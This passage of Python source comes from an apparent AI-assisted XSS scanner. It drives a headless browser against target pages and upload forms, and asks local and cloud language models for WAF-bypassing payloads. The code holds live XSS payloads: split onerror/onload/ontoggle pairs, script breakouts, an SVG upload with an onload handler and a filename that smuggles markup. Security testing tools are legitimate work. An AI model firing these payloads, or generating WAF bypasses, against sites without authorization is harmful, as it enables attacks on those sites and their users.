        from ai_xss_generator.probe import enrich_context
        from ai_xss_generator.models import generate_payloads
        from ai_xss_generator.learning import build_memory_profile

        if base_context is None:
            from ai_xss_generator.parser import parse_target
            base_context = parse_target(url=url, html_value=None, waf=waf, auth_headers=auth_headers)

        context = enrich_context(base_context, [probe_result])
        memory_profile = build_memory_profile(
            context=context,
            waf_name=waf,
            delivery_mode=delivery_mode,
        )
        payloads, engine, *_ = generate_payloads(
            context=context,
            model=model,
            waf=waf,
            use_cloud=False,  # local only at this step
            memory_profile=memory_profile,
            past_lessons=session_lessons,
            local_timeout_seconds=local_timeout_seconds,
        )
        if engine == "heuristic":
            return []
        return [
            p
            for p in payloads
            if getattr(p, "payload", "") and getattr(p, "source", "heuristic") != "heuristic"
        ]
    except Exception as exc:
        log.debug("Local model failed for %s param=%s: %s", url, probe_result.param_name, exc)
        return []


def _inject_dom_source(url: str, source_type: str, source_name: str, value: str) -> str:
    """Return *url* with *value* injected into the specified DOM-controlled source."""
    from ai_xss_generator.active.dom_xss import _inject_source
    return _inject_source(url, source_type, source_name, value)


def _cloud_note_for_engine(
    *,
    ai_backend: str,
    requested_cli_tool: str,
    engine: str,
) -> str:
    """Return a human-readable note when CLI cloud execution used failover."""
    if ai_backend != "cli":
        return ""
    actual_tool = engine.removeprefix("cli:")
    if not engine.startswith("cli:") or actual_tool == requested_cli_tool:
        return ""
    return f"CLI failover: requested {requested_cli_tool}, used {actual_tool}."


def _coerce_cloud_plan(value: Any) -> CloudPayloadPlan:
    """Normalize legacy/raw mocked cloud responses into CloudPayloadPlan."""
    from ai_xss_generator.types import PayloadCandidate

    if isinstance(value, CloudPayloadPlan):
        return value
    if isinstance(value, dict):
        payload_items = []
        for item in value.get("payloads", []):
            if isinstance(item, PayloadCandidate):
                payload_items.append(item)
            elif isinstance(item, dict):
                strategy = item.get("strategy")
                payload_items.append(PayloadCandidate(
                    payload=str(item.get("payload", "")).strip(),
                    title=str(item.get("title", "AI-generated payload")).strip() or "AI-generated payload",
                    explanation=str(item.get("explanation", "Tailored by model output.")).strip(),
                    test_vector=str(item.get("test_vector", "Inject into the highest-confidence sink.")).strip(),
                    tags=[str(tag) for tag in item.get("tags", []) if str(tag).strip()],
                    target_sink=str(item.get("target_sink", "")).strip(),
                    framework_hint=str(item.get("framework_hint", "")).strip(),
                    bypass_family=str(item.get("bypass_family", "")).strip(),
                    risk_score=int(item.get("risk_score", 0) or 0),
                    source=str(item.get("source", "heuristic") or "heuristic"),
                    strategy=strategy,
                ))
            elif item:
                payload_items.append(PayloadCandidate(
                    payload=str(item),
                    title="AI-generated payload",
                    explanation="Tailored by model output.",
                    test_vector="Inject into the highest-confidence sink.",
                    source="heuristic",
                ))
        return CloudPayloadPlan(
            payloads=payload_items,
            engine=str(value.get("engine", "")),
            note=str(value.get("note", "")),
        )
    if isinstance(value, list):
        return CloudPayloadPlan(payloads=list(value))
    return CloudPayloadPlan()


def _merge_ai_notes(*notes: str) -> str:
    merged = [note.strip() for note in notes if note and note.strip()]
    return " ".join(merged)


def _dom_hit_priority(hit: Any) -> tuple[int, str, str]:
    """Prefer client-only DOM sources before server-visible URL params."""
    source_rank = {
        "fragment": 0,
        "hash": 0,
        "query_param": 1,
    }
    return (
        source_rank.get(str(getattr(hit, "source_type", "")), 5),
        str(getattr(hit, "sink", "")),
        str(getattr(hit, "source_name", "")),
    )


def _split_attempts_for_context(context_type: str, first_param: str, second_param: str) -> list[CoordinatedPayloadAttempt]:
    attempts: list[CoordinatedPayloadAttempt] = []
    if context_type in {"html_body", "html_comment"}:
        attempts.extend([
            CoordinatedPayloadAttempt(
                context_type=context_type,
                param_payloads={first_param: "<img/src=x", second_param: "onerror=alert(1)>"},
                transform_name="split_img_onerror",
            ),
            CoordinatedPayloadAttempt(
                context_type=context_type,
                param_payloads={first_param: "<svg", second_param: "onload=alert(1)>"},
                transform_name="split_svg_onload",
            ),
            CoordinatedPayloadAttempt(
                context_type=context_type,
                param_payloads={first_param: "<details/open", second_param: "ontoggle=alert(1)>"},
                transform_name="split_details_toggle",
            ),
            CoordinatedPayloadAttempt(
                context_type=context_type,
                param_payloads={first_param: "<a/href=java", second_param: "script:alert(1)>x</a>"},
                transform_name="split_href_scheme",
            ),
        ])
    elif context_type in {"js_code", "js_string_dq", "js_string_sq", "js_string_bt", "json_value"}:
        attempts.extend([
            CoordinatedPayloadAttempt(
                context_type=context_type,
                param_payloads={first_param: "</script><script>", second_param: "alert(1)</script>"},
                transform_name="split_script_breakout",
            ),
            CoordinatedPayloadAttempt(
                context_type=context_type,
                param_payloads={first_param: "</script><script>", second_param: "alert(1)//"},
                transform_name="split_script_comment",
            ),
        ])
    return attempts


def _coordinated_split_attempts(probe_results: list[Any]) -> list[CoordinatedPayloadAttempt]:
    context_to_params: dict[str, list[str]] = {}
    for probe_result in probe_results:
        seen_contexts: set[str] = set()
        for reflection in getattr(probe_result, "reflections", []):
            context_type = str(getattr(reflection, "context_type", "") or "")
            if not context_type or context_type in seen_contexts:
                continue
            seen_contexts.add(context_type)
            context_to_params.setdefault(context_type, []).append(probe_result.param_name)

    attempts: list[CoordinatedPayloadAttempt] = []
    seen: set[tuple[str, tuple[tuple[str, str], ...]]] = set()
    for context_type, params in context_to_params.items():
        unique_params: list[str] = []
        for param in params:
            if param not in unique_params:
                unique_params.append(param)
        if len(unique_params) < 2:
            continue
        for index, first_param in enumerate(unique_params):
            for second_param in unique_params[index + 1:]:
                for ordered_first, ordered_second in ((first_param, second_param), (second_param, first_param)):
                    for attempt in _split_attempts_for_context(context_type, ordered_first, ordered_second):
                        dedup_key = (
                            attempt.context_type,
                            tuple(sorted(attempt.param_payloads.items())),
                        )
                        if dedup_key in seen:
                            continue
                        seen.add(dedup_key)
                        attempts.append(attempt)
    return attempts


def _coordinated_surviving_chars(probe_results: list[Any], context_type: str) -> str:
    merged: set[str] = set()
    for probe_result in probe_results:
        for reflection in getattr(probe_result, "reflections", []):
            if getattr(reflection, "context_type", "") == context_type:
                merged.update(getattr(reflection, "surviving_chars", frozenset()))
    return "".join(sorted(merged))


def _build_dom_context(
    *,
    base_context: Any,
    url: str,
    source_type: str,
    source_name: str,
    sink: str,
    code_location: str = "",
    auth_headers: dict[str, str] | None = None,
) -> Any:
    """Build a ParsedContext focused on one DOM source → sink taint path."""
    from dataclasses import replace as dc_replace
    from ai_xss_generator.types import DomSink, ParsedContext

    if base_context is None:
        base_context = ParsedContext(source=url, source_type="url")

    source_sink = "location.hash" if source_type == "fragment" else "location.search"
    dom_note = (
        "[dom:TAINT] "
        + json.dumps({
            "source_type": source_type,
            "source_name": source_name,
            "sink": sink,
            "code_location": code_location,
        }, sort_keys=True)
    )
    extra_sinks = [
        DomSink(
            sink=sink,
            source=f"dom_runtime_taint:{source_type}:{source_name}",
            location=code_location or f"dom_runtime:{source_type}:{source_name}",
            confidence=0.99,
        ),
        DomSink(
            sink=f"dom_source:{source_sink}",
            source=f"dom_runtime_source:{source_name}",
            location=f"dom_runtime:{source_type}:{source_name}",
            confidence=0.99,
        ),
    ]

    auth_notes = list(getattr(base_context, "auth_notes", []) or [])
    if auth_headers and not auth_notes:
        auth_notes.append("Authenticated DOM scan context")

    return dc_replace(
        base_context,
        dom_sinks=extra_sinks + list(getattr(base_context, "dom_sinks", []) or []),
        notes=[dom_note, *list(getattr(base_context, "notes", []) or [])],
        auth_notes=auth_notes,
    )


def _get_dom_local_payloads(
    *,
    context: Any,
    model: str,
    waf: str | None,
    session_lessons: list[Any] | None = None,
    local_timeout_seconds: int = _ACTIVE_LOCAL_MODEL_TIMEOUT_SECONDS,
) -> list[Any]:
    """Ask the local model for DOM XSS payloads for one tainted source → sink path."""
    try:
        from ai_xss_generator.models import generate_dom_local_payloads
        from ai_xss_generator.learning import build_memory_profile

        memory_profile = build_memory_profile(
            context=context,
            waf_name=waf,
            delivery_mode="dom",
        )
        payloads, engine = generate_dom_local_payloads(
            context=context,
            model=model,
            waf=waf,
            memory_profile=memory_profile,
            past_lessons=session_lessons,
            local_timeout_seconds=local_timeout_seconds,
        )
        return [
            p
            for p in payloads
            if getattr(p, "payload", "") and getattr(p, "source", "heuristic") != "heuristic"
        ]
    except Exception as exc:
        log.debug("DOM local model failed for %s: %s", getattr(context, "source", "?"), exc)
        return []


def _get_dom_cloud_payloads(
    *,
    context: Any,
    cloud_model: str,
    waf: str | None,
    ekey: str,
    dedup_registry: DictProxy,
    dedup_lock: Any,
    ai_backend: str = "api",
    cli_tool: str = "claude",
    cli_model: str | None = None,
    session_lessons: list[Any] | None = None,
    feedback_lessons: list[Any] | None = None,
) -> CloudPayloadPlan:
    """Call the cloud model once per unique DOM source → sink fingerprint."""
    use_dedup = not feedback_lessons
    if use_dedup:
        with dedup_lock:
            if ekey in dedup_registry:
                log.debug("DOM dedup hit — reusing cloud result for key %s", ekey[:12])
                cached = dict(dedup_registry[ekey])
                return CloudPayloadPlan(
                    payloads=list(cached.get("payloads", [])),
                    engine=str(cached.get("engine", "")),
                    note=str(cached.get("note", "")),
                )

    try:
        from ai_xss_generator.models import generate_cloud_payloads
        from ai_xss_generator.learning import build_memory_profile

        memory_profile = build_memory_profile(
            context=context,
            waf_name=waf,
            delivery_mode="dom",
        )
        payloads, engine = generate_cloud_payloads(
            context=context,
            cloud_model=cloud_model,
            waf=waf,
            past_lessons=_join_lessons(session_lessons, feedback_lessons),
            ai_backend=ai_backend,
            cli_tool=cli_tool,
            cli_model=cli_model,
            memory_profile=memory_profile,
        )
        result_plan = CloudPayloadPlan(
            payloads=[p for p in payloads if getattr(p, "payload", "")],
            engine=engine,
            note=_cloud_note_for_engine(
                ai_backend=ai_backend,
                requested_cli_tool=cli_tool,
                engine=engine,
            ),
        )
    except Exception as exc:
        log.debug("DOM cloud model failed for %s: %s", getattr(context, "source", "?"), exc)
        result_plan = CloudPayloadPlan()

    if use_dedup:
        with dedup_lock:
            dedup_registry[ekey] = {
                "payloads": [
                    payload.to_dict() if hasattr(payload, "to_dict") else payload
                    for payload in result_plan.payloads
                ],
                "engine": result_plan.engine,
                "note": result_plan.note,
            }
    return result_plan


# ---------------------------------------------------------------------------
# DOM XSS worker entry point
# ---------------------------------------------------------------------------

def run_dom_worker(
    url: str,
    waf_hint: str | None,
    model: str,
    cloud_model: str,
    use_cloud: bool,
    timeout_seconds: int,
    result_queue: "multiprocessing.Queue",
    dedup_registry: "DictProxy",
    dedup_lock: Any,
    auth_headers: dict[str, str] | None = None,
    ai_backend: str = "api",
    cli_tool: str = "claude",
    cli_model: str | None = None,
    cloud_attempts: int = 1,
) -> None:
    """Worker entry point for DOM XSS runtime scanning.

    Runs as an isolated multiprocessing.Process.  Launches its own Playwright
    browser, calls scan_dom_xss(), converts results to ConfirmedFinding objects,
    and puts a WorkerResult onto result_queue.
    """
    start_time = time.monotonic()

    def _put_result(result: WorkerResult) -> None:
        result.duration_seconds = time.monotonic() - start_time
        result_queue.put(result)

    try:
        _run_dom(
            url=url,
            waf_hint=waf_hint,
            model=model,
            cloud_model=cloud_model,
            use_cloud=use_cloud,
            timeout_seconds=timeout_seconds,
            put_result=_put_result,
            dedup_registry=dedup_registry,
            dedup_lock=dedup_lock,
            auth_headers=auth_headers,
            ai_backend=ai_backend,
            cli_tool=cli_tool,
            cli_model=cli_model,
            cloud_attempts=cloud_attempts,
        )
    except Exception as exc:
        log.exception("DOM worker crashed for %s", url)
        _put_result(WorkerResult(url=url, status="error", error=str(exc), kind="dom"))


def _run_dom(
    *,
    url: str,
    waf_hint: str | None,
    model: str,
    cloud_model: str,
    use_cloud: bool,
    timeout_seconds: int,
    put_result: Any,
    dedup_registry: "DictProxy",
    dedup_lock: Any,
    auth_headers: dict[str, str] | None = None,
    ai_backend: str = "api",
    cli_tool: str = "claude",
    cli_model: str | None = None,
    cloud_attempts: int = 1,
) -> None:
    from playwright.sync_api import sync_playwright
    from ai_xss_generator.active.dom_xss import (
        attempt_dom_payloads,
        discover_dom_taint_paths,
        fallback_payloads_for_sink,
    )
    from ai_xss_generator.parser import parse_target as _parse_target

    started_at = time.monotonic()
    deadline = started_at + active_worker_timeout_budget(
        timeout_seconds,
        use_cloud,
        ai_backend,
        cloud_attempts=cloud_attempts,
    )

    def _timed_out() -> bool:
        return time.monotonic() > deadline

    # Cap per-navigation timeout to 15 s regardless of the overall worker timeout
    nav_timeout_ms = min(timeout_seconds * 1_000, 15_000)
    local_model_timeout_seconds = _ACTIVE_LOCAL_MODEL_TIMEOUT_SECONDS
    _cached_context: Any = None
    try:
        _cached_context = _parse_target(
            url=url,
            html_value=None,
            waf=waf_hint,
            auth_headers=auth_headers,
        )
    except Exception as exc:
        log.debug("Pre-parse of DOM target %s failed: %s", url, exc)

    try:
        pw = sync_playwright().start()
        browser = pw.chromium.launch(
            headless=True,
            args=["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu"],
        )
        try:
            dom_hits = discover_dom_taint_paths(url, browser, auth_headers, timeout_ms=nav_timeout_ms)
            dom_hits = sorted(dom_hits, key=_dom_hit_priority)
        finally:
            browser.close()
            pw.stop()
    except Exception as exc:
        put_result(WorkerResult(
            url=url, status="error", error=f"DOM XSS scan failed: {exc}", kind="dom",
        ))
        return

    findings: list[ConfirmedFinding] = []
    cloud_escalated = False
    local_model_rounds = 0
    cloud_model_rounds = 0
    fallback_rounds = 0
    escalation_reasons: list[str] = []
    dom_session_lessons: list[Any] = []
    target_disposition: Any = None
    try:
        from ai_xss_generator.behavior import (
            attach_behavior_profile,
            build_target_behavior_profile,
            classify_target_disposition,
        )
        from ai_xss_generator.learning import build_memory_profile
        from ai_xss_generator.lessons import build_behavior_lessons, build_mapping_lessons

        behavior_profile = build_target_behavior_profile(
            url=url,
            delivery_mode="dom",
            waf_name=waf_hint,
            auth_required=bool(auth_headers),
            context=_cached_context,
            dom_hits=dom_hits,
        )
        _cached_context = attach_behavior_profile(_cached_context, behavior_profile)
        target_disposition = classify_target_disposition(
            _cached_context,
            delivery_mode="dom",
            dom_hits=len(dom_hits),
        )

        memory_profile = build_memory_profile(
            context=_cached_context,
            waf_name=waf_hint,
            delivery_mode="dom",
        )
        if auth_headers:
            memory_profile["auth_required"] = True
        dom_session_lessons.extend(build_behavior_lessons(behavior_profile))
        if _cached_context is not None:
            dom_session_lessons.extend(build_mapping_lessons(
                _cached_context,
                memory_profile=memory_profile,
            ))
    except Exception as exc:
        log.debug("DOM lesson build failed for %s: %s", url, exc)

    try:
        pw = sync_playwright().start()
        browser = pw.chromium.launch(
            headless=True,
            args=["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu"],
        )
        try:
            for hit in dom_hits:
                if _timed_out():
                    break
                dom_context = _build_dom_context(
                    base_context=_cached_context,
                    url=url,
                    source_type=hit.source_type,
                    source_name=hit.source_name,
                    sink=hit.sink,
                    code_location=hit.code_location,
                    auth_headers=auth_headers,
                )
                from ai_xss_generator.behavior import derive_ai_escalation_policy

                escalation_policy = derive_ai_escalation_policy(
                    dom_context,
                    delivery_mode="dom",
                    sink_context=hit.sink,
                )
                _append_reason(escalation_reasons, escalation_policy.note)
                confirmed = False
                fired_payload = ""
                fired_url = hit.canary_url
                detail = (
                    f"DOM taint confirmed — canary reached sink '{hit.sink}' via "
                    f"{hit.source_type}:{hit.source_name!r}. "
                    f"Real payload did not execute (possible CSP or payload mismatch)."
                )
                source = "dom_xss_runtime"
                transform_name = "dom_xss_runtime"
                cloud_used_for_hit = False
                ai_engine = ""
                ai_note = ""
                local_stage = None
                local_done = not escalation_policy.use_local
                local_payloads: list[str] = []
                local_payloads_tried = False
                cloud_stage = None
                cloud_rounds_started = 0
                cloud_rounds_exhausted = False
                cloud_plan = CloudPayloadPlan()
                cloud_payloads: list[str] = []
                cloud_feedback_lessons: list[Any] | None = None
                seen_cloud_payloads: set[str] = set()
                cloud_delay_deadline = time.monotonic() + (
                    escalation_policy.cloud_start_after_seconds
                    if escalation_policy.cloud_start_after_seconds is not None
                    else _DOM_CLOUD_START_AFTER_SECONDS
                )
                cloud_ekey = _escalation_key(
                    url=url,
                    param_name=hit.source_name,
                    waf=waf_hint,
                    surviving_chars=frozenset(),
                    context_type=f"dom:{hit.source_type}:{hit.sink}",
                )

                if escalation_policy.use_local and not _timed_out():
                    local_model_rounds += 1
                    local_stage = _start_async_payload_stage(lambda: _get_dom_local_payloads(
                        context=dom_context,
                        model=model,
                        waf=waf_hint,
                        session_lessons=dom_session_lessons,
                        local_timeout_seconds=min(
                            local_model_timeout_seconds,
                            escalation_policy.local_timeout_seconds,
                        ),
                    ))

                def _try_dom_payloads(payloads: list[str], stage_name: str) -> bool:
                    nonlocal confirmed, fired_payload, fired_url, detail
                    nonlocal source, transform_name, local_payloads_tried, cloud_used_for_hit, cloud_escalated
                    nonlocal ai_engine, ai_note
                    if not payloads or _timed_out():
                        return False
                    exec_ok, exec_payload, exec_detail = attempt_dom_payloads(
                        browser=browser,
                        url=url,
                        source_type=hit.source_type,
                        source_name=hit.source_name,
                        sink=hit.sink,
                        payloads=payloads,
                        auth_headers=auth_headers or {},
                        timeout_ms=nav_timeout_ms,
                    )
                    if stage_name == "local_model":
                        local_payloads_tried = True
                    if stage_name == "cloud_model":
                        cloud_used_for_hit = True
                        cloud_escalated = True
                        ai_engine = cloud_plan.engine
                        ai_note = _merge_ai_notes(
                            escalation_policy.note,
                            _cloud_attempt_note(
                                cloud_plan.note,
                                cloud_rounds_started,
                                max(1, cloud_attempts),
                            ),
                        )
                    if exec_ok:
                        confirmed = True
                        fired_payload = exec_payload
                        fired_url = _inject_dom_source(url, hit.source_type, hit.source_name, exec_payload)
                        detail = exec_detail
                        source = stage_name
                        transform_name = stage_name
                        return True
                    return False

                while not confirmed and not _timed_out():
                    if local_stage is not None and not local_done:
                        local_ready, payloads = _poll_async_payloads(local_stage[1])
                        if local_ready:
                            local_done = True
                            local_payloads = payloads
                            if _try_dom_payloads(local_payloads, "local_model"):
                                break

                    if use_cloud and cloud_stage is None and not cloud_rounds_exhausted:
                        should_start_cloud = (
                            local_done
                        ) or (not local_done and time.monotonic() >= cloud_delay_deadline)
                        if should_start_cloud:
                            cloud_rounds_started += 1
                            cloud_model_rounds += 1
                            cloud_escalated = True
                            cloud_stage = _start_async_payload_stage(lambda: _get_dom_cloud_payloads(
                                context=dom_context,
                                cloud_model=cloud_model,
                                waf=waf_hint,
                                ekey=cloud_ekey,
                                dedup_registry=dedup_registry,
                                dedup_lock=dedup_lock,
                                ai_backend=ai_backend,
                                cli_tool=cli_tool,
                                cli_model=cli_model,
                                session_lessons=dom_session_lessons,
                                feedback_lessons=cloud_feedback_lessons,
                            ))

                    if cloud_stage is not None:
                        cloud_ready, plan = _poll_async_payloads(cloud_stage[1])
                        if cloud_ready:
                            cloud_stage = None
                            cloud_plan = _coerce_cloud_plan(plan)
                            cloud_payloads, duplicate_payloads = _unique_new_payloads(
                                cloud_plan.payloads,
                                seen_cloud_payloads,
                            )
                            if _try_dom_payloads(cloud_payloads, "cloud_model"):
                                break
                            if cloud_rounds_started >= max(1, cloud_attempts):
                                cloud_rounds_exhausted = True
                            else:
                                cloud_feedback_lessons = _build_cloud_feedback_lessons(
                                    attempt_number=cloud_rounds_started,
                                    total_attempts=max(1, cloud_attempts),
                                    prompt_context=dom_context,
                                    delivery_mode="dom",
                                    context_type="dom_xss",
                                    sink_context=hit.sink,
                                    payloads_tried=cloud_payloads,
                                    duplicate_payloads=duplicate_payloads,
                                    observation="DOM sink stayed taint-only; no execution signal fired.",
                                )
                                cloud_delay_deadline = time.monotonic()

                    if local_done and (not use_cloud or cloud_rounds_exhausted) and cloud_stage is None:
                        break
                    if local_done and local_payloads_tried and (not use_cloud or (cloud_rounds_exhausted and cloud_stage is None)):
                        break
                    if local_done and not local_payloads and not use_cloud:
                        break
                    time.sleep(0.05)

                if not confirmed and not _timed_out():
                    fallback_rounds += 1
                    fallback_payloads = fallback_payloads_for_sink(hit.sink)
                    exec_ok, exec_payload, exec_detail = attempt_dom_payloads(
                        browser=browser,
                        url=url,
                        source_type=hit.source_type,
                        source_name=hit.source_name,
                        sink=hit.sink,
                        payloads=fallback_payloads,
                        auth_headers=auth_headers or {},
                        timeout_ms=nav_timeout_ms,
                    )
                    if exec_ok:
                        confirmed = True
                        fired_payload = exec_payload
                        fired_url = _inject_dom_source(url, hit.source_type, hit.source_name, exec_payload)
                        detail = exec_detail
                        source = "phase1_transform"
                        transform_name = "dom_static_fallback"
                        ai_note = _merge_ai_notes(
                            escalation_policy.note,
                            (
                                _cloud_attempt_note(
                                    cloud_plan.note,
                                    cloud_rounds_started,
                                    max(1, cloud_attempts),
                                )
                                if cloud_rounds_started
                                else cloud_plan.note
                            ),
                        )

                findings.append(
                    ConfirmedFinding(
                        url=url,
                        param_name=hit.source_name,
                        context_type="dom_xss",
                        sink_context=hit.sink,
                        payload=fired_payload,
                        transform_name=transform_name,
                        execution_method="dom_xss" if confirmed else "dom_taint",
                        execution_detail=detail,
                        waf=waf_hint,
                        surviving_chars="",
                        fired_url=fired_url,
                        source=source,
                        cloud_escalated=cloud_used_for_hit,
                        code_location=hit.code_location,
                        ai_engine=ai_engine,
                        ai_note=ai_note or escalation_policy.note,
                    )
                )
        finally:
            browser.close()
            pw.stop()
    except Exception as exc:
        put_result(WorkerResult(
            url=url, status="error", error=f"DOM XSS payload execution failed: {exc}", kind="dom",
        ))
        return

    if any(f.execution_method == "dom_xss" for f in findings):
        status = "confirmed"
    elif findings:
        status = "taint_only"
    else:
        status = "no_execution"
    put_result(WorkerResult(
        url=url,
        status=status,
        confirmed_findings=findings,
        waf=waf_hint,
        cloud_escalated=cloud_escalated,
        kind="dom",
        dead_target=bool(getattr(target_disposition, "is_dead", False)),
        dead_reason=(
            getattr(target_disposition, "reason", "")
            if findings or status == "taint_only"
            else (
                getattr(target_disposition, "reason", "")
                or "No DOM source-to-sink taint path was confirmed."
            )
        ),
        target_tier=getattr(target_disposition, "tier", "live"),
        local_model_rounds=local_model_rounds,
        cloud_model_rounds=cloud_model_rounds,
        fallback_rounds=fallback_rounds,
        escalation_reasons=escalation_reasons,
    ))


def _upload_attempts(upload_target: "UploadTarget") -> list[dict[str, Any]]:
    first_companion = upload_target.companion_field_names[0] if upload_target.companion_field_names else ""
    benign_defaults = {name: "axss" for name in upload_target.companion_field_names}
    svg_payload = '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"></svg>'
    attempts: list[dict[str, Any]] = [
        {
            "transform_name": "upload_svg_inline",
            "file_name": "axss-avatar.svg",
            "file_content": svg_payload,
            "companion_overrides": dict(benign_defaults),
            "payload_summary": "inline SVG upload with onload handler",
        },
        {
            "transform_name": "upload_filename_reflection",
            "file_name": "avatar\"><svg/onload=alert(1)>.svg",
            "file_content": '<svg xmlns="http://www.w3.org/2000/svg"><text>axss</text></svg>',
            "companion_overrides": dict(benign_defaults),
            "payload_summary": "filename breakout via SVG upload",
        },
    ]
    if first_companion:
        companion_overrides = dict(benign_defaults)
        companion_overrides[first_companion] = '<img src=x onerror=alert(1)>'
        attempts.append({
            "transform_name": "upload_companion_field",
            "file_name": "axss-profile.svg",
            "file_content": '<svg xmlns="http://www.w3.org/2000/svg"><text>axss</text></svg>',
            "companion_overrides": companion_overrides,
            "payload_summary": f"companion field {first_companion}=<img src=x onerror=alert(1)>",
        })
    return attempts


def _make_upload_finding(
    *,
    upload_target: "UploadTarget",
    result: Any,
    waf: str | None,
    payload_summary: str,
) -> ConfirmedFinding:
    return ConfirmedFinding(
        url=upload_target.action_url,
        param_name="+".join(upload_target.file_field_names),
        context_type="stored_upload",
        sink_context="upload_render",
        payload=payload_summary,
        transform_name=result.transform_name,
        execution_method=result.method,
        execution_detail=result.detail,
        waf=waf,
        surviving_chars="",
        fired_url=result.fired_url,
        source="phase1_transform",
        cloud_escalated=False,
    )


def run_upload_worker(
    upload_target: "UploadTarget",
    waf_hint: str | None,
    timeout_seconds: int,
    result_queue: "multiprocessing.Queue",
    auth_headers: dict[str, str] | None = None,
    sink_url: str | None = None,
) -> None:
    """Worker entry point for multipart upload targets."""
    start_time = time.monotonic()

    def _put_result(result: WorkerResult) -> None:
        result.duration_seconds = time.monotonic() - start_time
        result_queue.put(result)

    try:
        _run_upload(
            upload_target=upload_target,
            waf_hint=waf_hint,
            timeout_seconds=timeout_seconds,
            put_result=_put_result,
            auth_headers=auth_headers,
            sink_url=sink_url,
        )
    except Exception as exc:
        log.exception("Upload worker crashed for %s", upload_target.action_url)
        _put_result(WorkerResult(
            url=upload_target.action_url,
            status="error",
            error=str(exc),
            kind="upload",
        ))


def _run_upload(
    *,
    upload_target: "UploadTarget",
    waf_hint: str | None,
    timeout_seconds: int,
    put_result: Any,
    auth_headers: dict[str, str] | None = None,
    sink_url: str | None = None,
) -> None:
    from ai_xss_generator.active.executor import ActiveExecutor

    if not upload_target.file_field_names:
        put_result(WorkerResult(
            url=upload_target.action_url,
            status="no_params",
            waf=waf_hint,
            kind="upload",
            dead_target=True,
            dead_reason="No file input fields were available for upload testing.",
            target_tier="hard_dead",
        ))
        return

    deadline = time.monotonic() + max(timeout_seconds, 60)

    def _timed_out() -> bool:
        return time.monotonic() > deadline

    executor = ActiveExecutor(auth_headers=auth_headers)
    try:
        executor.start()
    except Exception as exc:
        put_result(WorkerResult(
            url=upload_target.action_url,
            status="error",
            error=f"Playwright start failed: {exc}",
            waf=waf_hint,
            kind="upload",
            target_tier="high_value",
        ))
        return

    confirmed_findings: list[ConfirmedFinding] = []
    total_transforms_tried = 0
    fallback_rounds = 0
    escalation_reasons = [
        "Artifact workflow discovered — using bounded deterministic upload attempts first.",
    ]
    try:
        for attempt in _upload_attempts(upload_target):
            if _timed_out():
                break
            total_transforms_tried += 1
            fallback_rounds += 1
            result = executor.fire_upload(
                source_page_url=upload_target.source_page_url,
                action_url=upload_target.action_url,
                file_field_names=upload_target.file_field_names,
                companion_overrides=attempt["companion_overrides"],
                file_name=attempt["file_name"],
                file_content=attempt["file_content"],
                transform_name=attempt["transform_name"],
                sink_url=sink_url,
            )
            if result.confirmed:
                confirmed_findings.append(_make_upload_finding(
                    upload_target=upload_target,
                    result=result,
                    waf=waf_hint,
                    payload_summary=attempt["payload_summary"],
                ))
                break
    finally:
        executor.stop()

    put_result(WorkerResult(
        url=upload_target.action_url,
        status="confirmed" if confirmed_findings else "no_execution",
        confirmed_findings=confirmed_findings,
        transforms_tried=total_transforms_tried,
        waf=waf_hint,
        params_tested=len(upload_target.file_field_names) + len(upload_target.companion_field_names),
        params_reflected=0,
        kind="upload",
        target_tier="high_value",
        fallback_rounds=fallback_rounds,
        escalation_reasons=escalation_reasons,
    ))


def _get_cloud_payloads(
    url: str,
    probe_result: Any,
    cloud_model: str,
    waf: str | None,
    ekey: str,
    dedup_registry: DictProxy,
    dedup_lock: Any,
    base_context: Any = None,
    auth_headers: dict[str, str] | None = None,
    ai_backend: str = "api",
    cli_tool: str = "claude",
    cli_model: str | None = None,
    delivery_mode: str = "get",
    session_lessons: list[Any] | None = None,
    feedback_lessons: list[Any] | None = None,
) -> CloudPayloadPlan:
    """Check dedup registry; call cloud model if this is a novel fingerprint.

    *base_context* is a pre-parsed ParsedContext for *url*. When provided it
    avoids a redundant HTTP fetch.
    """
    use_dedup = not feedback_lessons
    if use_dedup:
        with dedup_lock:
            if ekey in dedup_registry:
                log.debug("Dedup hit — reusing cloud result for key %s", ekey[:12])
                cached = dict(dedup_registry[ekey])
                return _coerce_cloud_plan(cached)

    try:
        from ai_xss_generator.probe import enrich_context
        from ai_xss_generator.models import generate_cloud_payloads
        from ai_xss_generator.learning import build_memory_profile

        if base_context is None:
            from ai_xss_generator.parser import parse_target
            base_context = parse_target(url=url, html_value=None, waf=waf, auth_headers=auth_headers)

        context = enrich_context(base_context, [probe_result])
        reference_payloads = _waf_reference_payloads(waf, probe_result)
        memory_profile = build_memory_profile(
            context=context,
            waf_name=waf,
            delivery_mode=delivery_mode,
        )
        payloads, engine = generate_cloud_payloads(
            context=context,
            cloud_model=cloud_model,
            waf=waf,
            reference_payloads=reference_payloads,
            past_lessons=_join_lessons(session_lessons, feedback_lessons),
            ai_backend=ai_backend,
            cli_tool=cli_tool,
            cli_model=cli_model,
            memory_profile=memory_profile,
        )
        result_plan = CloudPayloadPlan(
            payloads=[p.payload for p in payloads if p.payload],
            engine=engine,
            note=_cloud_note_for_engine(
                ai_backend=ai_backend,
                requested_cli_tool=cli_tool,
                engine=engine,
            ),
        )
    except Exception as exc:
        log.debug("Cloud escalation failed for %s: %s", url, exc)
        result_plan = CloudPayloadPlan()

    if use_dedup:
        with dedup_lock:
            dedup_registry[ekey] = {
                "payloads": list(result_plan.payloads),
                "engine": result_plan.engine,
                "note": result_plan.note,
            }

    return result_plan


# ---------------------------------------------------------------------------
# POST form worker entry point
# ---------------------------------------------------------------------------

def run_post_worker(
    post_form: "PostFormTarget",
    rate: float,
    waf_hint: str | None,
    model: str,
    cloud_model: str,
    use_cloud: bool,
    timeout_seconds: int,
    result_queue: "multiprocessing.Queue",
    dedup_registry: "DictProxy",
    dedup_lock: Any,
    findings_lock: Any,
    auth_headers: dict[str, str] | None = None,
    crawled_pages: list[str] | None = None,
    sink_url: str | None = None,
    ai_backend: str = "api",
    cli_tool: str = "claude",
    cli_model: str | None = None,
    cloud_attempts: int = 1,
) -> None:
    """Worker entry point for POST form targets. Mirrors run_worker() for GET URLs."""
    start_time = time.monotonic()

    def _put_result(result: WorkerResult) -> None:
        result.duration_seconds = time.monotonic() - start_time
        result_queue.put(result)

    try:
        _run_post(
            post_form=post_form,
            rate=rate,
            waf_hint=waf_hint,
            model=model,
            cloud_model=cloud_model,
            use_cloud=use_cloud,
            timeout_seconds=timeout_seconds,
